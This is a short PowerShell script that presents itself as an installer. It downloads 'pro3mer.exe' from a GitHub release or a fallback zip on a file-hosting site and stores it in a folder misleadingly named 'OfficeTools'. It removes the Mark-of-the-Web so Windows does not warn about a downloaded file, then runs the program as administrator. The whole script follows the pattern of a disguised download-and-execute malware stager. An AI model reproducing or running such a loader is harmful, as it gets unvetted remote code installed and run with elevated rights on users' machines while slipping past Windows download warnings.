$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Configuration
$Repo       = "alhlhli/pro3mer"
$ExeName    = "pro3mer.exe"
$AltZipUrl  = "https://file.garden/an5JdIrGtwwEoiH6/pro/pro3mer.zip"
$TargetDir  = "$env:LOCALAPPDATA\Programs\OfficeTools"
$ExePath    = Join-Path $TargetDir $ExeName
$ZipTemp    = Join-Path $TargetDir "update.zip"

New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null

# 2. Download from GitHub Releases (.exe)
$Downloaded = $false
try {
    Write-Host "Checking GitHub Releases..." -ForegroundColor Cyan
    $ApiUrl  = "https://api.github.com/repos/$Repo/releases/latest"
    $Asset   = (Invoke-RestMethod -Uri $ApiUrl -Headers @{"User-Agent"="PS"}).assets | 
               Where-Object { $_.name -eq $ExeName } | Select-Object -First 1

    if ($Asset) {
        Write-Host "Downloading $ExeName from GitHub..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $Asset.browser_download_url -OutFile $ExePath -UseBasicParsing
        $Downloaded = $true
    }
} catch {
    Write-Host "GitHub failed. Switching to fallback..." -ForegroundColor Yellow
}

# 3. Fallback Download & Extraction (.zip)
if (-not $Downloaded) {
    try {
        Write-Host "Downloading archive from fallback..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $AltZipUrl -OutFile $ZipTemp -UseBasicParsing
        Expand-Archive -Path $ZipTemp -DestinationPath $TargetDir -Force
        Remove-Item -Path $ZipTemp -Force -ErrorAction SilentlyContinue
        $Downloaded = Test-Path $ExePath
    } catch {
        Write-Error "Download failed: $($_.Exception.Message)"
        exit 1
    }
}


# 4. Unblock & Execute
if (Test-Path $ExePath) {
    Unblock-File -Path $ExePath -ErrorAction SilentlyContinue
    Write-Host "Launching application..." -ForegroundColor Green
    Start-Process -FilePath $ExePath -WorkingDirectory $TargetDir -Verb RunAs
} else {
    Write-Error "Executable not found at $ExePath"
    exit 1
}
